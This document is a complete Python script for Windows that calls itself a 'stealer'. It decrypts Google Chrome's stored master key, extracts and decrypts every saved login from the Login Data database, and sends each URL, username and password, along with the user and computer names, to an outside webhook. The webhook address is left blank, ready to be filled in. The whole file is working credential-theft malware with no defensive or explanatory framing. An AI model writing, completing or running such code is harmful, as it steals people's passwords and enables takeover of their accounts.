import os
import json
import base64
import sqlite3
import win32crypt
import shutil
from Crypto.Cipher import AES

import requests
from urllib.parse import quote as url_encode_str

### stealer functions ###
def get_master_key():
	with open(
		os.environ['USERPROFILE']  # the same as os.getlogin()
		+ os.sep  # path separator for the OS, windows "\\"
		+ r'AppData\Local\Google\Chrome\User Data\Local State', 
	'r') as f:
		local_state = f.read()
		local_state = json.loads(local_state)
	master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
	master_key = master_key[5:]  # bytes 5 onward are the master key
	master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
	return master_key

def generate_cipher(aes_key, initialization_vector):
	return AES.new(aes_key, AES.MODE_GCM, initialization_vector)

def decrypt_payload(cipher, payload):
	return cipher.decrypt(payload)

def decrypt_password_pre_v80(hashed_password): 
	return win32crypt.CryptUnprotectData(hashed_password)		

def decrypt_password(password_value_buffer, master_key):
	try:
		initialization_vector = password_value_buffer[3:15]  # 4th to 15th bytes
		payload = password_value_buffer[15:]  # 16th byte and onward
		cipher = generate_cipher(master_key, initialization_vector)
		decrypted_password = \
			decrypt_payload(cipher, payload)[:-16].decode()
		return decrypted_password
	except Exception as e:
		old_decrypted = decrypt_password_pre_v80(password_value_buffer)
		return old_decrypted

### webhook request ###
def main():
	webhook_url = ''  # insert webhook.site webhook here
	master_key = get_master_key()
	login_db = \
		os.environ['USERPROFILE'] \
		+ os.sep \
		+ r'AppData\Local\Google\Chrome\User Data\default\Login Data'

	shutil.copy2(login_db, 'Loginvault.db')
	conn = sqlite3.connect('Loginvault.db')
	cur = conn.cursor()
	try:
		pc_name = os.environ['COMPUTERNAME']  # get PC name
		pc_user = os.getlogin()  # get PC user's name
		requests.get(webhook_url + '/' + '?pc-user={}&pc-name={}'.format(
			pc_user, pc_name))
		cur.execute('SELECT action_url, username_value, password_value FROM logins')
		creds = []
		for r in cur.fetchall():
			url = r[0]
			username = r[1]
			# skip blank usernames (for some reason?)
			if len(username) == 0:
				continue
			encrypted_password = r[2]
			decrypted_password = decrypt_password(encrypted_password, master_key)
			# print(url, username, decrypted_password)
			creds.append((url, username, decrypted_password))
		for url, username, decrypted_password in creds:
			payload = '?url={}&user={}&pass={}'.format(
				url_encode_str(url),
				url_encode_str(username),
				url_encode_str(decrypted_password)
			)
			requests.get(webhook_url + '/' + payload)			
	except:
		pass
	cur.close()
	conn.close()

if __name__ == '__main__':
	main()

